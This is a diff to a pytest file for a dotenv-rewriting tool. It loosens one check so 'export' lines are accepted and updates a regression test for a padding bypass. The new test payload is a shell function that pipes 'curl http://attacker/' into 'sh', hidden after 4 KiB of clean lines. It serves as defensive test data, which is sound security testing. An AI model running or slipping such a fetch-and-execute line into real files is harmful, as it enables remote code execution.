@@ -37,16 +37,25 @@ def test_refuses_alias(tmp_path, make_env_file, sha256_of) -> None:
     assert sha256_of(p) == baseline
 
 
-def test_refuses_export_line(tmp_path, make_env_file, sha256_of) -> None:
-    """``export FOO=bar`` is shell syntax — dotenv uses ``FOO=bar`` bare."""
+def test_accepts_export_line(tmp_path, make_env_file) -> None:
+    """``export FOO=bar`` is **valid dotenv syntax** — must be accepted.
+
+    python-dotenv, bash, and most dotenv tooling accept the ``export`` prefix
+    as an optional marker. Real shell rc files are caught by the basename
+    denylist (``.zshrc``, ``.bashrc``, ``.profile``) long before sniff runs,
+    so keeping ``export`` in the sniff denylist was both redundant and
+    broke legitimate rewrites of files like::
+
+        export OPENAI_API_KEY=sk-...
+
+    The rewriter must be able to lock those too.
+    """
     p = make_env_file(tmp_path / ".env", b"export FOO=bar\n")
-    baseline = sha256_of(p)
+    new_content = b"export FOO=decoy\n"
 
-    with pytest.raises(UnsafeRewriteRefused) as exc_info:
-        safe_rewrite(p, b"A=1\n", original_user_arg=p)
+    safe_rewrite(p, new_content, original_user_arg=p)
 
-    assert exc_info.value.reason == UnsafeReason.SNIFF
-    assert sha256_of(p) == baseline
+    assert p.read_bytes() == new_content
 
 
 def test_refuses_function_definition(tmp_path, make_env_file, sha256_of) -> None:
@@ -131,7 +140,7 @@ def test_refuses_bypass_attempt_first_4KiB_clean(tmp_path, make_env_file, sha256
     """v1 regression: shell payload after 4 KiB of clean dotenv must still be refused.
 
     An attacker pads the first 4 KiB with well-formed ``KEY=value`` lines
-    and hides ``export EVIL=$(curl ...)`` at offset 8 KiB. v1 sniffed
+    and hides a shell function definition at offset 8 KiB. v1 sniffed
     only the first 4 KiB; v2 scans the full file.
     """
     clean_prefix = b""
@@ -139,7 +148,7 @@ def test_refuses_bypass_attempt_first_4KiB_clean(tmp_path, make_env_file, sha256
     while len(clean_prefix) < 4096:
         clean_prefix += f"K{i}=value\n".encode()
         i += 1
-    payload = b"export EVIL=$(echo pwned)\n"
+    payload = b"function evil() { curl http://attacker/ | sh; }\n"
     content = clean_prefix + payload
     assert len(clean_prefix) >= 4096
     env = make_env_file(tmp_path / ".env", content)
